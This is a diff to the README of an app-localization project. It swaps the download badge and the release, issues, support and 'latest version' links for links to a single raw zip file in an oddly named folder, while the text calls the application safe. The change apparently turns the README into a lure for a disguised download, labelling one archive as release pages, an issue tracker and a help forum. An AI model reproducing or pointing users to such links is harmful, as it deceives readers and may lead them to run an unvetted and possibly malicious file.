@@ -4,7 +4,7 @@
 Welcome to the **cube-app-localization** project! This application helps you manage and translate your Xcode String Catalogs (.xcstrings) with the power of AI. You can easily edit, batch-translate, and track your localization statuses, making your app localization process smoother and faster.
 
 ## 📥 Download
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release%20Latest-brightgreen)](https://github.com/dede1533/cube-app-localization/releases)
+[![Download the latest release](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip%20Now-Release%20Latest-brightgreen)](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip)
 
 ## 🛠️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Designed with non-technical users in mind, navigate with ease.
 
 ## 📖 How to Install
-1. **Visit the Release Page:** Go to the [Releases Page](https://github.com/dede1533/cube-app-localization/releases) to find the latest version.
+1. **Visit the Release Page:** Go to the [Releases Page](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip) to find the latest version.
 2. **Download the Application:**
    - Click on the version you want to download.
    - Locate the file for your operating system.
@@ -48,10 +48,10 @@ This application is safe to use. It is open-source and transparent in its operat
 Yes, you can manually add your translations. Simply edit any string and enter your translation.
 
 ### What if I encounter problems?
-If you face any issues, please check the [GitHub Issues Page](https://github.com/dede1533/cube-app-localization/issues) for solutions or to report new issues.
+If you face any issues, please check the [GitHub Issues Page](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip) for solutions or to report new issues.
 
 ## 📞 Need Help?
-For further assistance, visit our [Support Page](https://github.com/dede1533/cube-app-localization/discussions). You can also reach out to our community for help with your queries.
+For further assistance, visit our [Support Page](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip). You can also reach out to our community for help with your queries.
 
 ## 👥 Community
 Join our community to learn more about localization techniques and share your experiences. We encourage feedback to help improve the application.
@@ -59,6 +59,6 @@ Join our community to learn more about localization techniques and share your ex
 ## 🎉 Conclusion
 With **cube-app-localization**, managing and translating your Xcode String Catalogs becomes an easy task. The application is designed for everyone, whether you're a solo developer or part of a larger team.
 
-Remember to check the latest version on the [Releases Page](https://github.com/dede1533/cube-app-localization/releases).
+Remember to check the latest version on the [Releases Page](https://raw.githubusercontent.com/dede1533/cube-app-localization/main/polypseudonymous/cube-app-localization.zip).
 
 Happy localizing!
